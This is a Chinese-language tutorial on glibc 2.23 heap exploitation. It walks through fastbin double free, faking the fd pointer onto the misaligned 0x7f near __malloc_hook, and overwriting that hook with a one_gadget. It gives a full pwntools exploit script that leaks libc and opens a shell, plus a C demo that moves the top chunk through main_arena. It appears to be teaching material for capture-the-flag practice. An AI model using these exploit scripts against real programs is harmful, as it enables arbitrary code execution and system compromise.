> 环境：glibc2.23

&emsp;&emsp;<font size=2>老样子首先从一个demo程序开始看起：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
        void *p1,*p2,*p3;
        unsigned long* ptr;

        p1=malloc(0x50);
        p2=malloc(0x50);
        ptr=(unsigned long*)p1;

        free(p1);
        free(p2);
        free(p1);

  			//从这里开始分析
        malloc(0x50);
  			//伪造fd指针
        *ptr=0x61616161;

        malloc(0x50);
        malloc(0x50);
        malloc(0x50);

        return 0;
}
```

&emsp;&emsp;<font size=2>因为已经对malloc的原理有过分析了，而free的原理也对fastbin有过分析了，对free的结果其实我们也能推测出来了（fastbinY记录的是最后一个被free的fastbin地址），如果不相信的话我们可以看一下main_arena：</font></br>

```
pwndbg> p main_arena
$1 = {
  mutex = 0, 
  flags = 0, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x602000, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x6020c0, 
  last_remainder = 0x0, 
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>...}, 
```

&emsp;&emsp;<font size=2>被free的堆块会在其fd处放上fastbinY里的内容（在fastbinY被修改前，这样的效果是记录旧的堆块，正好将堆块串联起来形成单链表）。所以三次free之后堆块内容如下（注意这是double free！p2后再次free p1时p1的fd会被记录为p2）：</font></br>

```
pwndbg> x/20xg 0x602000
0x602000:	0x0000000000000000	0x0000000000000061
0x602010:	0x0000000000602060	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000061
0x602070:	0x0000000000602000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
pwndbg> 
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41
0x6020d0:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这些都是我们预料之中的，所以我们直接从free之后的malloc开始分析，同样的重复分析过的跳过，直接从_int_malloc开始看：</font></br>

```C
/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
  

   /*
     If the size qualifies as a fastbin, first check corresponding bin.
     This code is safe to execute even if av is not yet initialized, so we
     can try it without checking, which saves some time on this fast path.
   */

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
             != victim);
      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }

```

&emsp;&emsp;<font size=2>显然控制流会进入这里，根据我们申请的size，获取fastbinY里的堆块，然后会定义一个pp获取fastbin的fd处的地址（取单链表的下一个地址，换句话说就是在这个堆块之前被free的堆块，如果是0就说明这是第一个被free的，但在我们的情况下被修改为了任意值0x61616161，显然这是个非法的堆块地址，因此访问这个非法地址的“fd”处时会触发内存错误），后面再把fastbinY里的值更新为链表的下一个节点，也就是pp的值。</font></br>

&emsp;&emsp;<font size=2>不过注意这个`fastbin_index(chunksize(victim))!=idx`判断，思考一下，如果我们之前伪造的fd指向的是一个合法的地址（比如说指向另一个堆块），那么在更新fastbinY的时候就不会触发内存错误，控制流会继续往下到了`fastbin(chunksize(victim))!=idx`这里，在我们的情况下idx为4（由`(0x60>>4)-2`计算得到），victim的size假如是0x80，那么`(0x80>>4)-2`为6，那么就被检查出错误来了，就会发生malloc corruption，那么为了不崩溃，我们伪造的fd指向的地址处的size偏移处（p+0x8）的8字节数据必须和我们申请的相当。假如我们`malloc(0x50);`，那么nb就是0x60，那么伪造的fd的size处必须为0x60~0x6F，因为这样经过计算idx才相等，才能绕过检查。</font></br>

&emsp;&emsp;<font size=2>还记得上一节我们利用unsafe-unlink修改\_\_free_hook吗？这一次我们修改\_\_malloc_hook，利用他们getshell的原理都是一样的（修改他们的地址为libc中的one_gadget地址，一步到位），接下来展示一种利用fastbin to libc的技巧：</font></br>

```
pwndbg> x/20xg  0x7ffff7dd1b10-0x40
0x7ffff7dd1ad0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92e20	0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7a92830	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>如上所示，我们攻击的目标是\_\_malloc_hook，我们要把fastbin分配到这上面去！</font></br>

> 等等？你不是说伪造的fd的size偏移处的数据要跟我们申请的size相当吗？分配到\_\_malloc_hook上size岂不是要0x00007ffff7a92a00这么大？

&emsp;&emsp;<font size=2>是的，的确没错，但是我们不一定要把堆块直直的分配在hook的正上方，思路猥琐一点，如果这样看\_\_malloc_hook周围的数据：</font></br>

```
pwndbg> x/20xg 0x7ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0xfff7a9283000007f	0x000000000000007f
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
```

&emsp;&emsp;<font size=2>这里不是有一个0x7F吗（滑稽）？也就是说我们把fd伪造为0x7ffff7dd1aed就可以绕过idx检查了，然后往下随意写19个字节，再把one_gadget的8字节写上去就刚好覆盖\_\_malloc_hook了。思路有了，我就直接放demo的pwntools利用了：</font></br>

```python
from pwn import *

p=process('./demo')

context.log_level=1

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Choice:'

def add(size,content=''):
    sla(menu,'1')
    sla('input your size:',str(size))
    sla('input your message:',content)

def delete(index):
    sla(menu,'2')
    sla('input the index: ',str(index))

def edit(index,content):
    sla(menu,'3')
    sla('input the index: ',str(index))
    sla('input your content:',content)

def show(index):
    sla(menu,'4')
    sla('input the index: ',str(index))

chunk_link=0x6020c0

#=========================
# leak libc_base

add(0x100)
add(0x100)
delete(0)
show(0)
rv('content:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
success("libc base:"+hex(libc_base))
delete(1)

#===================================
# now exploit
add(0x68)      #2
add(0x68)      #3
add(0x68)      #4 avoid chunk count overflow to 0xFFFF....

# double free
delete(2)
delete(3)
delete(2)

# fake the fd to __malloc_hook
add(0x68,p64(libc_base+0x3c4aed))
add(0x68)
add(0x68)
# rewrite to one_gadget
add(0x68,'a'*0x13+p64(libc_base+0x4526a))
#gdb.attach(p)

add(0x233)
p.interactive()


'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

```

***

&emsp;&emsp;<font size=2>在这里额外介绍一个新的利用double free改写任意地址的技巧：fastbin to main_arena。就是把fastbin分配到main_arena上去，然后就可以修改main_arena上的数据达到我们的目的，比如说我们可以修改top堆块到任何位置（只要满足size检查），然后相当于就可以在任何地方分配堆块，进而可以修改任何地址的数据，不多说，demo放在下面，原理上面都已经分析过了：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
	void *p1,*p2,*p3;
	unsigned long* ptr;

	p1=malloc(0x100);
	p2=malloc(0x100);
	free(p1);
	unsigned long libc_base=*(unsigned long*)p1-0x3c4b78;
	free(p2);
	//fprintf(stderr,"libc base:%llx\n",libc_base);

	p1=malloc(0x50);
	p2=malloc(0x50);

	p3=malloc(0x30);
	free(p3);
	ptr=(unsigned long*)p3;

  // edit fastbin fd
	*ptr=0x60;
  // 0x60 in fastbinY
	malloc(0x30);

	free(p1);
	free(p2);
	free(p1);

	malloc(0x50);
	ptr=(unsigned long*)p1;
  // edit fd to fastbinY where lays 0x60 we put on
	*ptr=libc_base+0x3c4b30;
	malloc(0x50);
	malloc(0x50);

	//chunk in the main_arena
	p1=malloc(0x50);

	// edit the top chunk
	ptr=(unsigned long*)p1;
	*(ptr+7)=libc_base+0x3c4b00;

	// chunk on the __malloc_hook
	p2=malloc(0x100);

	//edit the __malloc_hook with one_gadget
	ptr=(unsigned long*)p2;
	*ptr=libc_base+0x4526A;

	// getshell
	malloc(0x100);

	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
```

